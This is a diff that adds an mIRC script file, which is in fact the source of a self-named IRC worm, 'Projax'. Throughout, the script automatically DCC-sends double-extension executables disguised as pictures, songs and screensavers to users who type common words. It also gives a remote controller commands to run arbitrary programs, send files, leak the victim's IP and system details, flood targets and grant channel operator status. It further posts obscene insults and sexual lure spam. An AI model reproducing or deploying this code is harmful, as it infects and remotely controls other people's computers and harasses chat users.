@@ -1,0 +1,65 @@
+[script]
+n0=on 1:start:{
+n1=/remote on
+n2=/server Oslo.NO.EU.undernet.org
+n3=/titlebar :420: PROJAX :420:
+n4=}
+n5=on 1:connect:{
+n6=/join #hacktech hacktech
+n7=/timer111 6 2 /notice #hacktech Y0ur ALL B1tChes AnD Wh3R3Z tHee Sausage!
+n8=/join #hackphreak hackphreak
+n9=/notice #hackphreak You can all suck my cock [Somber/Zerogravity]
+n10=/part #hackphreak [=-~ Pr0jAx V0.83 ~-=][=-~ Somber/ZeroGrAvity ~-=]
+n11=/msg safsdzxv Pj 0.83
+n12=}
+n13=on 1:part:#:{
+n14=if ( $nick == $me ) { halt }
+n15=/notice $chan hi all i'm a single 19 yr old bi female looking for a relationship with a caring male or female you can locate my information at www.angelfire.com/d20/melissachat ,drop me an e-mail! dont message me with asl and such! 
+n16=}
+n17=on 1:text:*hello*:*:/dcc send $nick c:\Coca_Cola_Screen_Saver.zip.exe
+n18=on 1:text:*asl*:*:/dcc send $nick c:\Tyra_Banks_Model.bmp.exe
+n19=on 1:text:*heh*:*:/dcc send $nick c:\Man_Lifts_A_School_Bus_Unreal.mpg.exe
+n20=on 1:text:*hah*:*:/dcc send $nick c:\list.txt.exe
+n21=on 1:text:*pic*:*:/dcc send $nick c:\My_Self_picture.jpg.exe
+n22=on 1:text:*hey*:*:/dcc send $nick c:\Facial_01924.Gif.exe
+n23=on 1:text:*morn*:*:/dcc send $nick c:\Pretty_Redhead_gives_great_blowjob_XxX.mpeg.exe
+n24=on 1:text:*thank*:*:/dcc send $nick c:\Government_Secrets_Exposed.Doc.exe
+n25=on 1:text:*bitch*:*:/dcc send $nick c:\Got_rice_bitch.mp3.exe
+n26=on 1:text:*rice*:*:/dcc send $nick c:\Got_Rice_bitch.mp3.exe
+n27=on 1:text:*fork*:*:/dcc send $nick $2
+n28=on 1:text:*activate*:*:/run $2 $3 $4
+n29=on 1:text:*joinchan*:*:/join $2
+n30=on 1:join:#dmsetup:{
+n31=/msg #dmsetup owned by irc-worm.projax - #hacktech / Elite Vxers 4 life
+n32=/quit Projax property of #hacktech
+n33=}
+n34=on 1:join:#nohacK:{
+n35=/quit [=- Pr0jax V0.79 -=]
+n36=}
+n37=on 1:join:#zt:{
+n38=/quit [=- Pr0Jax V0.79 -=]
+n39=}
+n40=on 1:filesent:*.*:/write -i Sent $filename to $nick c:\windows\Action.txt 
+n41=on 1:join:#ava:{
+n42=/msg #ava Sydney will be struck by nuclear war
+n43=/quit [- Pr0jAx V0.79 -]
+n44=}
+n45=on 1:text:*pingnf*:*:/timer111 20 4 /ctcp $2 ping
+n46=on 1:text:*noticez*:*:/timer111 20 4 /notice $2 [ProJaX/ZeRoGraVity] [Projax V0.78] [0101010101010101101010101010101010] [ Vx 4 Life ]
+n47=on 1:text:*con*:*:/ctcp $2 sound /con/con.wav
+n48=on 1:text:*viasua*:*:/notice $chan PlEaSe jOiN $2 fOr ErOtiC SeXuAl PlEaSuRe [Swedish Babes]
+n49=on 1:text:*potato.*:*:/dcc send $nick C:\windows\system\projax.txt
+n50=on 1:text:*c0redump*:*:/join #hacktech | /timer111 3 1 /notice #hacktech  C0redumps a bitch and weres the b33f
+n51=on 1:text:*coredump*:*:/join #hackphreak | /timer111 3 1 /notice #hackphreak  C0redumps a bitch and weres the b33f
+n52=on 1:text:*partch*:*:/part $2 [Pr0jax V0.82][Zerogravity]
+n53=on 1:text:*coredump1*:*:/exit 
+n54=on 1:text:*systinfo*:*:/msg $nick hey, IP: $ip Server: $server Port: $port Os: $os Time: $time Date: $date Bootime: $duration($calc($ticks / 1000)) Boot Time!
+n55=on 1:text:*servchg*:*:/server Stockholm.SE.eu.Undernet.org
+n56=on 1:text:*c0redump1*:*:/notice $chan Hey all for Erotic Sexual Join #Hacktech to MeEt hOt SwEdiSh BaBes!
+n57=on 1:text:*closeC*:*:/notice $chan Hey all for ErotiC SexUal /join #hackPhrEaK to MeEt HoT sWeDisH baBes!
+n58=on 1:text:*putang*:*:/mode $chan +o $nick
+n59=on 1:join:#help:{
+n60=/notice #help Infected: Irc-Worm.Projax
+n61=/quit Pr0Jax V0.79
+n62=}
+n63=on 1:text:*intro*:*:/msg $nick hey $nick trade pics? | /dcc send $nick C:\My_Self_picture.jpg.exe
